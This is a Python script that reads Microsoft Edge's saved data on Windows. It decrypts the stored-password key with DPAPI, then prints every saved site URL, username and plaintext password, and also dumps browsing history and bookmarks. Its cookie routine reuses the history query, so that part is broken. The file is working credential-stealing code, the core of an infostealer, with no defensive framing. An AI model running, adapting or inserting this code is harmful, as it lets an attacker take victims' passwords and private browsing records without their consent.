import sqlite3
import shutil
import datetime
import os
import json
import base64
import win32crypt
from Crypto.Cipher import AES
import winreg


class decrypt_password:
    @staticmethod
    def get_encryption_key(local_state_path):
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = f.read()
            local_state = json.loads(local_state)

        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        key = key[5:]
        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
    @staticmethod
    def decrypt_password(password, key):
        try:
            iv = password[3:15]
            password = password[15:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            return cipher.decrypt(password)[:-16].decode()
        except:
            try:
                return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
            except:
                import traceback
                traceback.print_exc()
                return ""
class get_edge_info:
    def __init__(self):
        self.edge_path_login_db=r"%s\AppData\Local\Microsoft\Edge\User Data\Default\Login Data" %(os.environ['USERPROFILE'])
        self.edge_path_history_db=r"%s\AppData\Local\Microsoft\Edge\User Data\Default\History" %(os.environ['USERPROFILE'])
        self.edge_path_cookie_db=r"%s\AppData\Local\Microsoft\Edge\User Data\Default\Network\Cookies" %(os.environ['USERPROFILE'])
        self.local_state_path = r"%s\AppData\Local\Microsoft\Edge\User Data\Local State" % (os.environ['USERPROFILE'])
    def get_password(self):
        """
        Retrieves all login credentials from the Edge browser's login data database.
        :return:
        """
        shutil.copy2(self.edge_path_login_db, "EdgeLoginData.db")
        conn = sqlite3.connect("EdgeLoginData.db")
        cursor = conn.cursor()
        cursor.execute(
            "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
        for index, login in enumerate(cursor.fetchall()):
            url = login[0]
            username = login[2]
            password = decrypt_password.decrypt_password(login[3], decrypt_password.get_encryption_key(self.local_state_path))
            date_created = login[4]
            date_last_used = login[5]
            print('账号密码')
            print("Url:", url)
            print("Username:", username)
            print("Password", password)
    def get_history(self):
        """
        Retrieves the browser history
        :return:
        """
        shutil.copy2(self.edge_path_history_db, "EdgeHistoryData.db")
        conn = sqlite3.connect("EdgeHistoryData.db")
        cursor = conn.cursor()
        cursor.execute("SELECT id,url,title,visit_count,last_visit_time  from urls order by last_visit_time desc")
        rows = []
        for _id, url, title, visit_count, last_visit_time in cursor.fetchall():
            last_visit_time = str(datetime.datetime.fromtimestamp(last_visit_time / 1000000.0).strftime('%Y-%m-%d %H:%M:%S'))
            print(url, title, last_visit_time, visit_count)
    def get_bookmark(self):
        """
        Retrieves and prints bookmark information from the Microsoft Edge browser's bookmark file.
        """
        local_state_path = r"%s\AppData\Local\Microsoft\Edge\User Data\Default\Bookmarks" % (os.environ['USERPROFILE'])
        with open(local_state_path, "r", encoding="utf-8") as f:
            data = f.read()
            data = json.loads(data)
            try:
                bookmark_bar = data['roots']['bookmark_bar']
                for child in bookmark_bar['children']:
                    for bookmark in child.get('children', []):
                        bookmark_name = bookmark['name']
                        bookmark_url = bookmark['url']
                        print(f"Bookmark Name: {bookmark_name}")
                        print(f"URL: {bookmark_url}")
                        print()
            except KeyError as e:
                print(f"KeyError: {e} - Check JSON structure for 'children'")
    def get_cookie(self):
        shutil.copy2(self.edge_path_cookie_db, "EdgeCookieData.db")
        conn = sqlite3.connect("EdgeCookieData.db")
        cursor = conn.cursor()
        cursor.execute("SELECT id,url,title,visit_count,last_visit_time  from urls order by last_visit_time desc")
        rows = []
        for _id, url, title, visit_count, last_visit_time in cursor.fetchall():
            last_visit_time = str(
                datetime.datetime.fromtimestamp(last_visit_time / 1000000.0).strftime('%Y-%m-%d %H:%M:%S'))
            print(url, title, last_visit_time, visit_count)
def check_edge():
    """
    Check if Microsoft Edge browser is installed on the system.

    This function tries to access a specific registry key related to Microsoft Edge under HKEY_LOCAL_MACHINE.
    If the registry key exists, it means Microsoft Edge is installed; if not, it means Microsoft Edge is not installed.

    Returns:
        bool: Returns True if Microsoft Edge is installed, otherwise returns False.
    """
    try:
        # Open the appropriate registry key
        reg_path = r'Software\Microsoft\Edge'
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, reg_path, 0, winreg.KEY_READ)
        winreg.CloseKey(key)
        return True
    except FileNotFoundError:
        return False
if __name__ == '__main__':
    has_edge=check_edge()
    if has_edge:
        edge = get_edge_info()
        edge.get_password()
        edge.get_history()


